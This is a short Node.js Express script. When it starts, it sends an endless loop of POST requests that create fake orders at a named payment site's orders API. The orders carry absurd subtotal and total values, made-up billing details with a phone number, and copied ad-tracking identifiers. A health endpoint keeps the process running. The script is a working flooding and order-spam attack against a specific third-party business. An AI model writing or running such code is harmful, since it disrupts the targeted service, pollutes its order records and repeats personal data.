const express = require("express");

const server = express();
const LIMIT = 10000;

async function noBe10x() {
  //for (let i = 0; i < LIMIT; i++) {
  let i = 0;
  while (true) {
    const response = await fetch("https://pay.be10x.in/api/orders", {
      method: "POST",
      body: JSON.stringify({
        payment_method: "RZP - 10XPay",
        payment_method_title: "Direct Bank Transfer",
        status: "pending",
        tax_class: "standard",
        billing: {
          first_name: "Real Estater",
          email: "realestate@caller.com",
          phone: "9962247902",
        },
        line_items: [
          {
            product_id: 819929,
            quantity: 1,
            subtotal:
              "9999999999999999999999999999999999999999999999999999999.14",
            subtotal_tax: "0",
            total: "9999999999999999999999999999999999999999999999999999999.14",
            total_tax: "0",
          },
        ],
        meta_data: [
          {
            key: "_afl_wc_utm_utm_campaign_1st",
            value: "|20980038463",
          },
          {
            key: "_afl_wc_utm_utm_source_1st",
            value: "google",
          },
          {
            key: "_afl_wc_utm_utm_medium_1st",
            value: "cpc",
          },
          {
            key: "_afl_wc_utm_utm_content_1st",
            value: "|163877906328",
          },
          {
            key: "_afl_wc_utm_utm_term_1st",
            value: "",
          },
          {
            key: "_afl_wc_utm_utm_campaign",
            value: "|20980038463",
          },
          {
            key: "_afl_wc_utm_utm_source",
            value: "google",
          },
          {
            key: "_afl_wc_utm_utm_medium",
            value: "cpc",
          },
          {
            key: "_afl_wc_utm_utm_content",
            value: "|163877906328",
          },
          {
            key: "_afl_wc_utm_utm_term",
            value: "",
          },
          {
            key: "_afl_wc_utm_gclid_value",
            value:
              "CjwKCAjwoa2xBhACEiwA1sb1BM1BcCNtQbAr_iy-MMjtm2spywOOZezFenzMg5PRJfbpnxSe12lyORoCw3oQAvD_BwE",
          },
          {
            key: "_afl_wc_utm_gclid_visit",
            value: "1.1.1407013502.1713175576.992006508.1714187418.1714187444",
          },
          {
            key: "_afl_wc_utm_gclid_visit_date_local",
            value: "2024-04-27 09:23:53",
          },
          {
            key: "_afl_wc_utm_gclid_visit_date_utc",
            value: "2024-04-27 03:53:53",
          },
          {
            key: "_afl_wc_utm_sess_ga",
            value: "GA1.1.1604184060.1693466663",
          },
          {
            key: "_afl_wc_utm_sess_landing_clean",
            value: "",
          },
          {
            key: "_afl_wc_utm_utm_1st_url",
            value: "",
          },
          {
            key: "_afl_wc_utm_fbclid_visit_date_local",
            value: "2024-04-27 09:23:53",
          },
          {
            key: "_afl_wc_utm_fbclid_visit_date_utc",
            value: "2024-04-27 03:53:53",
          },
          {
            key: "_afl_wc_utm_fbclid_value",
            value: "",
          },
          {
            key: "_afl_wc_utm_fbclid_url",
            value: "",
          },
          {
            key: "_afl_wc_utm_fbclid_url_clean",
            value: "",
          },
        ],
      }),
      headers: {
        "Content-Type": "application/json",
      },
    });
    const result = await response.json();
    console.log(i, result.msg);
    i++;
  }
}

server.get("/health", (req, res) => {
  res.json({ success: true });
});

const PORT = 3000;
noBe10x();

server.listen(PORT, () => {
  console.log(`server running at port: ${PORT}`);
});
